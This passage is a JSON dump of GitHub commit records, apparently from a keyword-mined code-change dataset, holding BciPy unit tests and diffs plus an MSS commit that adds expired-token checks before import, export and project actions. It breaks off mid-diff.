self.daq.device_info=mock() self.daq.device_info.fs=10 self.mock_eeg=mock_get_data_response(samples=1000, high=1000, low=-1000, channels=4) def tearDown(self) -> None: unstub() def test_get_data_for_decision_returns_tuple_of_eeg_data_and_triggers(self): when(self.daq).get_data(start=any, limit=any).thenReturn(self.mock_eeg) response=get_data_for_decision(self.inquiry_timing, self.daq) self.assertIsInstance(response, tuple) eeg_data, timing=response self.assertIsInstance(timing, list) def test_get_data_for_decision_prestim(self): prestim=1 first_stim_time=self.inquiry_timing[0][1] last_stim_time=self.inquiry_timing[-1][1] expected_start=first_stim_time -prestim expected_stop=last_stim_time expected_triggers=[(text,((timing) -first_stim_time)) for text, timing in self.inquiry_timing] expected_data_limit=round((expected_stop -expected_start) * self.daq.device_info.fs) when(self.daq).get_data(start=expected_start, limit=expected_data_limit).thenReturn(self.mock_eeg) _, timing=get_data_for_decision( self.inquiry_timing, self.daq, prestim=prestim) self.assertEqual(timing, expected_triggers) verify(self.daq, times=1).get_data(start=expected_start, limit=expected_data_limit) def test_get_data_for_decision_poststim(self): poststim=1 first_stim_time=self.inquiry_timing[0][1] last_stim_time=self.inquiry_timing[-1][1] expected_triggers=[(text,((timing) -first_stim_time)) for text, timing in self.inquiry_timing] expected_data_limit=round((last_stim_time -first_stim_time +poststim) * self.daq.device_info.fs) when(self.daq).get_data(start=first_stim_time, limit=expected_data_limit).thenReturn(self.mock_eeg) _, timing=get_data_for_decision( self.inquiry_timing, self.daq, poststim=poststim) self.assertEqual(timing, expected_triggers) verify(self.daq, times=1).get_data(start=first_stim_time, limit=expected_data_limit) def test_get_data_for_decision_offset(self): offset=1 first_stim_time=self.inquiry_timing[0][1] last_stim_time=self.inquiry_timing[-1][1] expected_start=first_stim_time +offset expected_stop=last_stim_time +offset expected_triggers=[(text,((timing) -first_stim_time)) for text, timing in self.inquiry_timing] expected_data_limit=round((expected_stop -expected_start) * self.daq.device_info.fs) when(self.daq).get_data(start=expected_start, limit=expected_data_limit).thenReturn(self.mock_eeg) _, timing=get_data_for_decision( self.inquiry_timing, self.daq, offset=offset) self.assertEqual(timing, expected_triggers) verify(self.daq, times=1).get_data(start=expected_start, limit=expected_data_limit) def test_get_data_for_decision_throws_insufficient_data_error_if_less_than_data_limit(self): when(self.daq).get_data(start=any, limit=any).thenReturn([]) with self.assertRaises(InsufficientDataException): get_data_for_decision(self.inquiry_timing, self.daq) def test_get_data_for_decision_throws_insufficient_data_error_if_data_query_out_of_bounds(self): inquiry_timing=[('A', 10),('D', 1)] with self.assertRaises(InsufficientDataException): get_data_for_decision(inquiry_timing, self.daq) if __name__=='__main__': unittest.main() ","sourceWithComments":"import unittest\n\nfrom typing import List\nfrom collections import Counter\nfrom mockito import unstub, mock, when, verify, verifyStubbedInvocationsAreUsed\n\nimport numpy as np\nimport psychopy\n\nfrom bcipy.acquisition.client import DataAcquisitionClient\nfrom bcipy.acquisition.record import Record\nfrom bcipy.task.exceptions import InsufficientDataException\n\nfrom bcipy.helpers.task import (\n    _float_val,\n    alphabet,\n    calculate_stimulation_freq,\n    construct_triggers,\n    generate_targets,\n    get_data_for_decision,\n    get_key_press,\n    target_info\n)\n\n\nclass TestAlphabet(unittest.TestCase):\n    def test_alphabet_text(self):\n        parameters = {}\n\n        parameters['is_txt_stim'] = True\n\n        alp = alphabet(parameters)\n\n        self.assertEqual(\n            alp,\n            ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L',\n             'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X',\n             'Y', 'Z', '<',\n             '_'])\n\n    def test_alphabet_images(self):\n        parameters = {}\n        parameters['is_txt_stim'] = False\n        parameters['path_to_presentation_images'] = ('bcipy\/static\/images\/'\n                                                     'rsvp\/')\n\n        alp = alphabet(parameters)\n\n        self.assertNotEqual(\n            alp,\n            ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L',\n             'M', 'N', 'O', 'P', 'R', 'S', 'T', 'U', 'V', 'Y', 'Z', '<',\n             '_'])\n\n\nclass TestCalculateStimulationFreq(unittest.TestCase):\n    def test_calculate_stimulate_frequency_returns_number_less_one(self):\n        flash_time = 5\n        stimulation_frequency = calculate_stimulation_freq(flash_time)\n        expected = 1 \/ flash_time\n        self.assertEqual(stimulation_frequency, expected)\n\n    def test_calculate_stimulate_frequency_handles_zero(self):\n        flash_time = 0\n        with self.assertRaises(ZeroDivisionError):\n            calculate_stimulation_freq(flash_time)\n\n\nclass TestFloatVal(unittest.TestCase):\n    def test_float_val_as_str(self):\n        col = 'Apple'\n        result = _float_val(col)\n        expected = 1.0\n        self.assertEqual(result, expected)\n\n    def test_float_val_as_int(self):\n        col = 3\n        result = _float_val(col)\n        expected = 3.0\n        self.assertEqual(result, expected)\n\n\nclass TestTargetGeneration(unittest.TestCase):\n    \"\"\"Tests for generation of target inquiries\"\"\"\n\n    def test_target_number_less_than_alp(self):\n        \"\"\"Test when requested number of targets is less than the length of\n        the alphabet.\"\"\"\n        alp = list(range(10))\n        targets = generate_targets(alp, 5)\n        self.assertEqual(len(targets), 5)\n        self.assertEqual(len(targets), len(set(targets)))\n\n    def test_target_greater_than_alp(self):\n        \"\"\"Test behavior when number of targets is greater than the length\n        of the alphabet\"\"\"\n        alp = list(range(5))\n        targets = generate_targets(alp, 10)\n        self.assertEqual(len(targets), 10)\n\n        counts = Counter(targets)\n\n        for item in alp:\n            self.assertEqual(counts[item], 2)\n\n    def test_remainder(self):\n        \"\"\"Test behavior when number of targets is greater than the length of\n        the alphabet by a value other than a multiple of the alphabet length.\n        \"\"\"\n        alp = list(range(5))\n        targets = generate_targets(alp, 12)\n\n        counts = Counter(targets)\n        for item in alp:\n            self.assertGreaterEqual(counts[item], 2)\n            self.assertLessEqual(counts[item], 3)\n\n\nclass TestGetKeyPress(unittest.TestCase):\n    \"\"\"Tests for the get key press method\"\"\"\n\n    def tearDown(self):\n        verifyStubbedInvocationsAreUsed()\n        unstub()\n\n    def test_get_key_press_appends_stamp_label_defaults(self):\n        \"\"\"Test for the stamp label defaults, ensures the calls occur with the correct inputs to psychopy\"\"\"\n        key_list = ['space']\n        clock = mock()\n        # get keys returns a list of lists with the key and timestamp per hit\n        key_response = [[key_list[0], 1000]]\n        when(psychopy.event).getKeys(keyList=key_list,\n                                     timeStamped=True).thenReturn(key_response)\n        when(clock).getTime().thenReturn(psychopy.core.getTime())\n        # use the default label\n        stamp_label = 'bcipy_key_press'\n        expected = [f'{stamp_label}_{key_response[0][0]}', key_response[0][1]]\n        response = get_key_press(key_list, clock)\n        self.assertEqual(expected[0], response[0])\n        self.assertAlmostEqual(expected[1], response[1], delta=0.01)\n\n    def test_get_key_press_clock_adjustment(self):\n        \"\"\"Test for the stamp label defaults, ensures the calls occur with the correct inputs to psychopy\"\"\"\n        key_list = ['space']\n        clock = mock()\n        # get keys returns a list of lists with the key and timestamp per hit\n        key_response = [[key_list[0], 1000]]\n        when(psychopy.event).getKeys(keyList=key_list,\n                                     timeStamped=True).thenReturn(key_response)\n        when(clock).getTime().thenReturn(psychopy.core.getTime() + 100)\n        # use the default label\n        stamp_label = 'bcipy_key_press'\n        expected = [f'{stamp_label}_{key_response[0][0]}', key_response[0][1]]\n        response = get_key_press(key_list, clock)\n        self.assertEqual(expected[0], response[0])\n        self.assertAlmostEqual(1100, response[1], delta=0.01)\n\n    def test_get_key_press_returns_none_if_no_keys_pressed(self):\n        \"\"\"Test for the case not keys are returned, ensures the calls occur with the correct inputs to psychopy\"\"\"\n\n        key_list = ['space']\n        key_response = None\n        clock = mock()\n        when(psychopy.event).getKeys(keyList=key_list,\n                                     timeStamped=True).thenReturn(key_response)\n\n        response = get_key_press(key_list, clock)\n        self.assertEqual(None, response)\n\n    def test_get_key_press_set_custom_stamp_message(self):\n        \"\"\"Test for a custom stamp label, ensures the calls occur with the correct inputs to psychopy\"\"\"\n        clock = mock()\n        key_list = ['space']\n        # get keys returns a list of lists with the key and timestamp per hit\n        key_response = [[key_list[0], 1000]]\n        when(psychopy.event).getKeys(keyList=key_list,\n                                     timeStamped=True).thenReturn(key_response)\n        when(clock).getTime().thenReturn(psychopy.core.getTime())\n        # set a custom label\n        stamp_label = 'custom_label'\n        expected = [f'{stamp_label}_{key_response[0][0]}', key_response[0][1]]\n        response = get_key_press(key_list, clock, stamp_label=stamp_label)\n        self.assertEqual(expected[0], response[0])\n        self.assertAlmostEqual(expected[1], response[1], delta=0.01)\n\n\nclass TestTriggers(unittest.TestCase):\n    \"\"\"Tests related to triggers\"\"\"\n\n    def test_construct_triggers(self):\n        stim_times = [['+', 7.009946188016329], ['<', 7.477798109990545],\n                      ['_', 7.69470399999409], ['Z', 7.911495972017292],\n                      ['U', 8.128477902995655], ['S', 8.345279764995212],\n                      ['T', 8.562265532993479], ['V', 8.779025560012087],\n                      ['X', 8.995945784990909], ['Y', 9.213076218002243],\n                      ['W', 9.429835998016642]]\n        expected = [('+', 0.0), ('<', 0.46785192197421566),\n                    ('_', 0.6847578119777609), ('Z', 0.901549784000963),\n                    ('U', 1.1185317149793264), ('S', 1.3353335769788828),\n                    ('T', 1.5523193449771497), ('V', 1.7690793719957583),\n                    ('X', 1.9859995969745796), ('Y', 2.203130029985914),\n                    ('W', 2.4198898100003134)]\n        self.assertEqual(expected, construct_triggers(stim_times))\n        self.assertEqual([], construct_triggers([]))\n\n    def test_target_info(self):\n        triggers = [('+', 0.0), ('<', 0.46785192197421566),\n                    ('_', 0.6847578119777609), ('Z', 0.901549784000963),\n                    ('U', 1.1185317149793264), ('S', 1.3353335769788828),\n                    ('T', 1.5523193449771497), ('V', 1.7690793719957583),\n                    ('X', 1.9859995969745796), ('Y', 2.203130029985914),\n                    ('W', 2.4198898100003134)]\n        expected = [\n            'nontarget', 'nontarget', 'nontarget', 'target', 'nontarget',\n            'nontarget', 'nontarget', 'nontarget', 'nontarget', 'nontarget',\n            'nontarget'\n        ]\n        self.assertEqual(expected, target_info(triggers, target_letter='Z'))\n\n        expected = [\n            'nontarget', 'nontarget', 'nontarget', 'nontarget', 'nontarget',\n            'nontarget', 'nontarget', 'nontarget', 'nontarget', 'nontarget',\n            'nontarget'\n        ]\n        self.assertEqual(expected, target_info(triggers))\n        self.assertEqual([], target_info([]))\n\n\ndef mock_get_data_response(samples: int, high: float, low: float, channels: int) -> List[Record]:\n    \"\"\"Mock DataAcquisitionClient Response.\n\n    The data acquisition client returns a list of records that need to be looped through\n        to get the raw data without other items attached.\n    \"\"\"\n    data = [np.random.uniform(low, high) for _ in range(channels)]\n    record_data = []\n    for i in range(samples):\n        record_data.append(Record(data, i, None))\n    return record_data\n\n\nclass TestGetDataForDecision(unittest.TestCase):\n\n    def setUp(self) -> None:\n        self.inquiry_timing = [('A', 1), ('B', 2), ('C', 3)]\n        self.daq = mock(spec=DataAcquisitionClient)\n        self.daq.device_info = mock()\n        self.daq.device_info.fs = 10\n        self.mock_eeg = mock_get_data_response(samples=1000, high=1000, low=-1000, channels=4)\n\n    def tearDown(self) -> None:\n        unstub()\n\n    def test_get_data_for_decision_returns_tuple_of_eeg_data_and_triggers(self):\n        when(self.daq).get_data(start=any, limit=any).thenReturn(self.mock_eeg)\n\n        response = get_data_for_decision(self.inquiry_timing, self.daq)\n\n        self.assertIsInstance(response, tuple)\n\n        eeg_data, timing = response\n\n        # self.assertEqual(eeg_data[:1][0], self.mock_eeg[0].data[0])\n        self.assertIsInstance(timing, list)\n\n    def test_get_data_for_decision_prestim(self):\n        prestim = 1\n        first_stim_time = self.inquiry_timing[0][1]\n        last_stim_time = self.inquiry_timing[-1][1]\n\n        expected_start = first_stim_time - prestim\n        expected_stop = last_stim_time\n        expected_triggers = [(text, ((timing) - first_stim_time))\n                             for text, timing in self.inquiry_timing]\n        expected_data_limit = round((expected_stop - expected_start) * self.daq.device_info.fs)\n\n        when(self.daq).get_data(start=expected_start, limit=expected_data_limit).thenReturn(self.mock_eeg)\n        _, timing = get_data_for_decision(\n            self.inquiry_timing,\n            self.daq,\n            prestim=prestim)\n\n        # self.assertEqual(eeg_data[:1][0], self.mock_eeg[0].data[0])\n        self.assertEqual(timing, expected_triggers)\n        verify(self.daq, times=1).get_data(start=expected_start, limit=expected_data_limit)\n\n    def test_get_data_for_decision_poststim(self):\n        poststim = 1\n        first_stim_time = self.inquiry_timing[0][1]\n        last_stim_time = self.inquiry_timing[-1][1]\n\n        expected_triggers = [(text, ((timing) - first_stim_time))\n                             for text, timing in self.inquiry_timing]\n        expected_data_limit = round((last_stim_time - first_stim_time + poststim) * self.daq.device_info.fs)\n\n        when(self.daq).get_data(start=first_stim_time, limit=expected_data_limit).thenReturn(self.mock_eeg)\n        _, timing = get_data_for_decision(\n            self.inquiry_timing,\n            self.daq,\n            poststim=poststim)\n\n        # self.assertEqual(eeg_data[:1][0], self.mock_eeg[0].data[0])\n        self.assertEqual(timing, expected_triggers)\n        verify(self.daq, times=1).get_data(start=first_stim_time, limit=expected_data_limit)\n\n    def test_get_data_for_decision_offset(self):\n        offset = 1\n        first_stim_time = self.inquiry_timing[0][1]\n        last_stim_time = self.inquiry_timing[-1][1]\n\n        expected_start = first_stim_time + offset\n        expected_stop = last_stim_time + offset\n        expected_triggers = [(text, ((timing) - first_stim_time))\n                             for text, timing in self.inquiry_timing]\n        expected_data_limit = round((expected_stop - expected_start) * self.daq.device_info.fs)\n\n        when(self.daq).get_data(start=expected_start, limit=expected_data_limit).thenReturn(self.mock_eeg)\n        _, timing = get_data_for_decision(\n            self.inquiry_timing,\n            self.daq,\n            offset=offset)\n\n        # self.assertEqual(eeg_data[:1][0], self.mock_eeg[0].data[0])\n        self.assertEqual(timing, expected_triggers)\n        verify(self.daq, times=1).get_data(start=expected_start, limit=expected_data_limit)\n\n    def test_get_data_for_decision_throws_insufficient_data_error_if_less_than_data_limit(self):\n\n        # return an empty list from the get data call\n        when(self.daq).get_data(start=any, limit=any).thenReturn([])\n\n        with self.assertRaises(InsufficientDataException):\n            get_data_for_decision(self.inquiry_timing, self.daq)\n\n    def test_get_data_for_decision_throws_insufficient_data_error_if_data_query_out_of_bounds(self):\n        inquiry_timing = [('A', 10), ('D', 1)]\n\n        with self.assertRaises(InsufficientDataException):\n            get_data_for_decision(inquiry_timing, self.daq)\n\n\nif __name__ == '__main__':\n    unittest.main()\n"},"\/bcipy\/task\/paradigm\/rsvp\/copy_phrase.py":{"changes":[{"diff":"\n                         target_stimuli: str,\n                         current_text: str,\n                         decision: Decision,\n-                        evidence_types: List[EvidenceType] = []) -> Inquiry:\n+                        evidence_types: List[EvidenceType] = None) -> Inquiry:\n         \"\"\"Construct a new inquiry data record.\n \n         Parameters\n","add":1,"remove":1,"filename":"\/bcipy\/task\/paradigm\/rsvp\/copy_phrase.py","badparts":["                        evidence_types: List[EvidenceType] = []) -> Inquiry:"],"goodparts":["                        evidence_types: List[EvidenceType] = None) -> Inquiry:"]},{"diff":"\n         evidence for the provided evidence_types, leaving the other types empty\n         \"\"\"\n         assert self.current_inquiry, \"Current inquiry is required\"\n+        evidence_types = evidence_types or []\n         triggers = construct_triggers(self.stims_for_decision(stim_times))\n         data = Inquiry(stimuli=self.current_inquiry.stimuli,\n                        timing=self.current_inquiry.durations,\n                        triggers=triggers,\n-                       target_info=target_info(triggers, target_stimuli),\n+                       target_info=target_info(triggers, target_stimuli,\n+                                               self.parameters['is_txt_stim']),\n                        target_letter=target_stimuli,\n                        current_text=current_text,\n                        target_text=self.copy_phrase,\n","add":3,"remove":1,"filename":"\/bcipy\/task\/paradigm\/rsvp\/copy_phrase.py","badparts":["                       target_info=target_info(triggers, target_stimuli),"],"goodparts":["        evidence_types = evidence_types or []","                       target_info=target_info(triggers, target_stimuli,","                                               self.parameters['is_txt_stim']),"]},{"diff":"\n                         target_stimuli: str,\n                         current_text: str,\n                         decision: Decision,\n-                        evidence_types: List[EvidenceType] = []) -> Inquiry:\n+                        evidence_types: List[EvidenceType] = None) -> Inquiry:\n         \"\"\"Construct a new inquiry data record.\n \n         Parameters\n","add":1,"remove":1,"filename":"\/bcipy\/task\/paradigm\/rsvp\/copy_phrase.py","badparts":["                        evidence_types: List[EvidenceType] = []) -> Inquiry:"],"goodparts":["                        evidence_types: List[EvidenceType] = None) -> Inquiry:"]},{"diff":"\n         evidence for the provided evidence_types, leaving the other types empty\n         \"\"\"\n         assert self.current_inquiry, \"Current inquiry is required\"\n+        evidence_types = evidence_types or []\n         triggers = construct_triggers(self.stims_for_decision(stim_times))\n         data = Inquiry(stimuli=self.current_inquiry.stimuli,\n                        timing=self.current_inquiry.durations,\n                        triggers=triggers,\n-                       target_info=target_info(triggers, target_stimuli),\n+                       target_info=target_info(triggers, target_stimuli,\n+                                               self.parameters['is_txt_stim']),\n                        target_letter=target_stimuli,\n                        current_text=current_text,\n                        target_text=self.copy_phrase,\n","add":3,"remove":1,"filename":"\/bcipy\/task\/paradigm\/rsvp\/copy_phrase.py","badparts":["                       target_info=target_info(triggers, target_stimuli),"],"goodparts":["        evidence_types = evidence_types or []","                       target_info=target_info(triggers, target_stimuli,","                                               self.parameters['is_txt_stim']),"]}]}},"msg":"#181489190 ; updated stimuli labels in copy phrase session to ensure that fixation stimuli are labeled as 'fixation' rather than 'nontarget'"}},"https:\/\/github.com\/Open-MSS\/MSS":{"9cf29bbb7d3f2dd8e83abec623e81c35dcbc3cf7":{"url":"https:\/\/api.github.com\/repos\/Open-MSS\/MSS\/commits\/9cf29bbb7d3f2dd8e83abec623e81c35dcbc3cf7","html_url":"https:\/\/github.com\/Open-MSS\/MSS\/commit\/9cf29bbb7d3f2dd8e83abec623e81c35dcbc3cf7","message":"Verify valid token, fixes #975 (#987)\n\n* fixed error message (#962)\r\n\r\n* improved install\/update of MSS (#966)\r\n\r\n* improved install\/update of MSS\r\n\r\n* updated env order and added an important hint\r\n\r\nCo-authored-by: J. Ungermann <j.ungermann@fz-juelich.de>\r\n\r\n* preparation v3.0.4 (#967)\r\n\r\n* Changed vertical section interpolation to treat masked values as NaN (#983)\r\n\r\nArray is properly masked, but interpolation routine ignored mask.\r\nFilling the array with NaN should solve this issue.\r\nResulting array is properly masked again.\r\n\r\nFix #811\r\n\r\n* Import\/Export Extensions, fixes #918 (#981)\r\n\r\n* export plugins added\r\n\r\n* import plugins added\r\n\r\n* removed a doubled import\r\n\r\n* popup message when all is done\r\n\r\n* first change model than reload views\r\n\r\n* waypoints_model.dataChanged added\r\n\r\n* saved after import\r\n\r\n* reorganized, removed double commits\r\n\r\n* import saves xml content, worklocally with ftml files\r\n\r\n* Added option to display a secondary axis in SideView. (#980)\r\n\r\nFix #571\r\n\r\nCo-authored-by: ReimarBauer <rb.proj@gmail.com>\r\n\r\n* enables to configure a EXPIRATION time in seconds, fixes #948 (#974)\r\n\r\n* enables to configure a EXPIRATION time in seconds\r\n\r\nwe catch now various problems for an expired session,\r\nbesides on a timelimit a session also expires on server restart.\r\n\r\n* popup message for new login requires added\r\n\r\n* flake8 fix\r\n\r\nCo-authored-by: J. Ungermann <j.ungermann@fz-juelich.de>\r\n\r\n* verbose output on chat who made changes\r\n\r\n* fixed typo\r\n\r\n* ToDo added\r\n\r\n* verifies expired user token and forces login\r\n\r\n* fixation of qt (#988)\r\n\r\n* added sorting for project list (#990)\r\n\r\nCo-authored-by: J. Ungermann <j.ungermann@fz-juelich.de>\r\n\r\n* Mscolab: collaborator can access version history (#925)\r\n\r\n* Mscolab: collaborator can access version history\r\n\r\n* updated mscolab.py\r\n\r\n* mscolab docs updated\r\n\r\n* mscolab.py updated\r\n\r\nCo-Authored-By: ReimarBauer <rb.proj@gmail.com>\r\n\r\n* added \"collaborator\" in file_manager\r\n\r\n* fixed: flake8\r\n\r\n* file_manager.py updated\r\n\r\n* updated file_manager.py\r\n\r\n* refactored mscolab permissions\r\n\r\n* update\r\n\r\n* refactored permissions in  \"set_active_pid\"\r\n\r\nCo-Authored-By: ReimarBauer <rb.proj@gmail.com>\r\n\r\n* closed windows after permission updated\r\n\r\n* merged: permission based closing of mscolab windows and disabling buttons to single function\r\n\r\nIt will increase maintainability\r\n\r\nCo-Authored-By: J. Ungermann <28449201+joernu76@users.noreply.github.com>\r\n\r\n* called `handle_mscolab_buttons` inside other functions\r\n\r\nCo-Authored-By: J. Ungermann <28449201+joernu76@users.noreply.github.com>\r\n\r\nCo-authored-by: ReimarBauer <rb.proj@gmail.com>\r\nCo-authored-by: J. Ungermann <j.ungermann@fz-juelich.de>\r\nCo-authored-by: J. Ungermann <28449201+joernu76@users.noreply.github.com>\r\n\r\n* flake8 fix\r\n\r\nCo-authored-by: J. Ungermann <j.ungermann@fz-juelich.de>\r\nCo-authored-by: Aravind Murali <aravindmurali711@gmail.com>\r\nCo-authored-by: Jatin Jain <72596619+Jatin2020-24@users.noreply.github.com>\r\nCo-authored-by: J. Ungermann <28449201+joernu76@users.noreply.github.com>","sha":"9cf29bbb7d3f2dd8e83abec623e81c35dcbc3cf7","keyword":"session fixation update","diff":"diff --git a\/mslib\/mscolab\/sockets_manager.py b\/mslib\/mscolab\/sockets_manager.py\nindex 647b37868..95beed07e 100644\n--- a\/mslib\/mscolab\/sockets_manager.py\n+++ b\/mslib\/mscolab\/sockets_manager.py\n@@ -206,12 +206,14 @@ def handle_file_save(self, json_req):\n             # if permission is correct and file saved properly\n             if perm and self.fm.save_file(int(p_id), content, user, comment):\n                 # send service message\n-                message_ = \"[service message] saved changes\"\n+                message_ = f\"[service message] **{user.username}** saved changes\"\n                 new_message = self.cm.add_message(user, message_, str(p_id), message_type=MessageType.SYSTEM_MESSAGE)\n                 new_message_dict = get_message_dict(new_message)\n                 socketio.emit('chat-message-client', json.dumps(new_message_dict), room=str(p_id))\n                 # emit file-changed event to trigger reload of flight track\n                 socketio.emit('file-changed', json.dumps({\"p_id\": p_id, \"u_id\": user.id}), room=str(p_id))\n+        else:\n+            logging.debug(f'login expired for {user.username}, state unauthorized!')\n \n     def emit_file_change(self, p_id):\n         socketio.emit('file-changed', json.dumps({\"p_id\": p_id}), room=str(p_id))\ndiff --git a\/mslib\/msui\/mscolab.py b\/mslib\/msui\/mscolab.py\nindex e4e2e9d9d..7a5010b15 100644\n--- a\/mslib\/msui\/mscolab.py\n+++ b\/mslib\/msui\/mscolab.py\n@@ -279,61 +279,70 @@ def text_changed(self):\n         self.loginButton.setEnabled(self.emailid.text() != \"\" and self.password.text() != \"\")\n \n     def handle_import(self):\n-        if self.workLocallyCheckBox.isChecked():\n-            file_path = get_open_filename(self, \"Select a file\", \"\", \"Flight track (*.ftml)\")\n-        else:\n-            file_type = [\"Flight track (*.ftml)\"] + [f\"Flight track (*.{ext})\" for ext in self.import_plugins.keys()]\n-            file_path = get_open_filename(self, \"Select a file\", \"\", ';;'.join(file_type))\n-        if file_path is None:\n-            return\n-        dir_path, file_name = fs.path.split(file_path)\n-        file_name = fs.path.basename(file_path)\n-        name, file_ext = fs.path.splitext(file_name)\n-        if file_ext[1:] == \"ftml\":\n-            with open_fs(dir_path) as file_dir:\n-                xml_content = file_dir.readtext(file_name)\n-            try:\n-                model = ft.WaypointsTableModel(xml_content=xml_content)\n-            except SyntaxError:\n-                show_popup(self, \"Import Failed\", f\"The file - {file_name}, does not contain valid XML\")\n-                return\n-            self.waypoints_model = model\n+        if self.verify_user_token():\n             if self.workLocallyCheckBox.isChecked():\n-                self.waypoints_model.save_to_ftml(self.local_ftml_file)\n-                self.waypoints_model.dataChanged.connect(self.handle_waypoints_changed)\n+                file_path = get_open_filename(self, \"Select a file\", \"\", \"Flight track (*.ftml)\")\n             else:\n+                file_type = [\"Flight track (*.ftml)\"] + [f\"Flight track (*.{ext})\"\n+                                                         for ext in self.import_plugins.keys()]\n+                file_path = get_open_filename(self, \"Select a file\", \"\", ';;'.join(file_type))\n+            if file_path is None:\n+                return\n+            dir_path, file_name = fs.path.split(file_path)\n+            file_name = fs.path.basename(file_path)\n+            name, file_ext = fs.path.splitext(file_name)\n+            if file_ext[1:] == \"ftml\":\n+                with open_fs(dir_path) as file_dir:\n+                    xml_content = file_dir.readtext(file_name)\n+                try:\n+                    model = ft.WaypointsTableModel(xml_content=xml_content)\n+                except SyntaxError:\n+                    show_popup(self, \"Import Failed\", f\"The file - {file_name}, does not contain valid XML\")\n+                    return\n+                self.waypoints_model = model\n+                if self.workLocallyCheckBox.isChecked():\n+                    self.waypoints_model.save_to_ftml(self.local_ftml_file)\n+                    self.waypoints_model.dataChanged.connect(self.handle_waypoints_changed)\n+                else:\n+                    self.conn.save_file(self.token, self.active_pid, xml_content, comment=None)\n+                    self.waypoints_model.dataChanged.connect(self.handle_waypoints_changed)\n+            else:\n+                _function = self.import_plugins[file_ext[1:]]\n+                _, new_waypoints = _function(file_path)\n+                model = ft.WaypointsTableModel(waypoints=new_waypoints)\n+                self.waypoints_model = model\n+                xml_doc = self.waypoints_model.get_xml_doc()\n+                xml_content = xml_doc.toprettyxml(indent=\"  \", newl=\"\\n\")\n                 self.conn.save_file(self.token, self.active_pid, xml_content, comment=None)\n                 self.waypoints_model.dataChanged.connect(self.handle_waypoints_changed)\n+            self.reload_view_windows()\n+            show_popup(self, \"Import Success\", f\"The file - {file_name}, was imported successfully!\", 1)\n         else:\n-            _function = self.import_plugins[file_ext[1:]]\n-            _, new_waypoints = _function(file_path)\n-            model = ft.WaypointsTableModel(waypoints=new_waypoints)\n-            self.waypoints_model = model\n-            xml_doc = self.waypoints_model.get_xml_doc()\n-            xml_content = xml_doc.toprettyxml(indent=\"  \", newl=\"\\n\")\n-            self.conn.save_file(self.token, self.active_pid, xml_content, comment=None)\n-            self.waypoints_model.dataChanged.connect(self.handle_waypoints_changed)\n-        self.reload_view_windows()\n-        show_popup(self, \"Import Success\", f\"The file - {file_name}, was imported successfully!\", 1)\n+            show_popup(self, \"Error\", \"Your Connection is expired. New Login required!\")\n+            self.logout()\n \n     def handle_export(self):\n-        # Setting default filename path for filedialogue\n-        default_filename = self.active_project_name + \".ftml\"\n-        file_type = [\"Flight track (*.ftml)\"] + [f\"Flight track (*.{ext})\" for ext in self.export_plugins.keys()]\n-        file_path = get_save_filename(self, \"Save Flight track\", default_filename, ';;'.join(file_type))\n-        if file_path is None:\n-            return\n-        file_name = fs.path.basename(file_path)\n-        file_name, file_ext = fs.path.splitext(file_name)\n-        if file_ext[1:] == \"ftml\":\n-            xml_doc = self.waypoints_model.get_xml_doc()\n-            dir_path, file_name = fs.path.split(file_path)\n-            with open_fs(dir_path).open(file_name, 'w') as file:\n-                xml_doc.writexml(file, indent=\"  \", addindent=\"  \", newl=\"\\n\", encoding=\"utf-8\")\n+        if self.verify_user_token():\n+            # Setting default filename path for filedialogue\n+            default_filename = self.active_project_name + \".ftml\"\n+            file_type = [\"Flight track (*.ftml)\"] + [f\"Flight track (*.{ext})\" for ext in self.export_plugins.keys()]\n+            file_path = get_save_filename(self, \"Save Flight track\", default_filename, ';;'.join(file_type))\n+            if file_path is None:\n+                return\n+            file_name = fs.path.basename(file_path)\n+            file_name, file_ext = fs.path.splitext(file_name)\n+            if file_ext[1:] == \"ftml\":\n+                xml_doc = self.waypoints_model.get_xml_doc()\n+                dir_path, file_name = fs.path.split(file_path)\n+                with open_fs(dir_path).open(file_name, 'w') as file:\n+                    xml_doc.writexml(file, indent=\"  \", addindent=\"  \", newl=\"\\n\", encoding=\"utf-8\")\n+            else:\n+                _function = self.export_plugins[file_ext[1:]]\n+                _function(file_path, file_name, self.waypoints_model.waypoints)\n+                show_popup(self, \"Export Success\", f\"The file - {file_name}, was exported successfully!\", 1)\n         else:\n-            _function = self.export_plugins[file_ext[1:]]\n-            _function(file_path, file_name, self.waypoints_model.waypoints)\n-            show_popup(self, \"Export Success\", f\"The file - {file_name}, was exported successfully!\", 1)\n+            show_popup(self, \"Error\", \"Your Connection is expired. New Login required!\")\n+            self.logout()\n \n     def disable_project_buttons(self):\n         self.save_ft.setEnabled(False)\n@@ -399,16 +408,20 @@ def add_project_handler(self):\n             return\n         else:\n             logging.debug(self.token)\n-        self.proj_diag = QtWidgets.QDialog()\n-        self.add_proj_dialog = add_project_ui.Ui_addProjectDialog()\n-        self.add_proj_dialog.setupUi(self.proj_diag)\n-        self.add_proj_dialog.f_content = None\n-        self.add_proj_dialog.buttonBox.accepted.connect(self.add_project)\n-        self.add_proj_dialog.buttonBox.button(QtWidgets.QDialogButtonBox.Ok).setEnabled(False)\n-        self.add_proj_dialog.path.textChanged.connect(self.check_and_enable_project_accept)\n-        self.add_proj_dialog.description.textChanged.connect(self.check_and_enable_project_accept)\n-        self.add_proj_dialog.browse.clicked.connect(self.set_exported_file)\n-        self.proj_diag.show()\n+        if self.verify_user_token():\n+            self.proj_diag = QtWidgets.QDialog()\n+            self.add_proj_dialog = add_project_ui.Ui_addProjectDialog()\n+            self.add_proj_dialog.setupUi(self.proj_diag)\n+            self.add_proj_dialog.f_content = None\n+            self.add_proj_dialog.buttonBox.accepted.connect(self.add_project)\n+            self.add_proj_dialog.buttonBox.button(QtWidgets.QDialogButtonBox.Ok).setEnabled(False)\n+            self.add_proj_dialog.path.textChanged.connect(self.check_and_enable_project_accept)\n+            self.add_proj_dialog.description.textChanged.connect(self.check_and_enable_project_accept)\n+            self.add_proj_dialog.browse.clicked.connect(self.set_exported_file)\n+            self.proj_diag.show()\n+        else:\n+            show_popup(self, \"Error\", \"Your Connection is expired. New Login required!\")\n+            self.logout()\n \n     def check_and_enable_project_accept(self):\n         if self.add_proj_dialog.path.text() != \"\" and self.add_proj_dialog.description.toPlainText() != \"\":\n@@ -517,84 +530,100 @@ def open_help_dialog(self):\n             self.help_dialog.show()\n \n     def handle_delete_project(self):\n-        entered_project_name, ok = 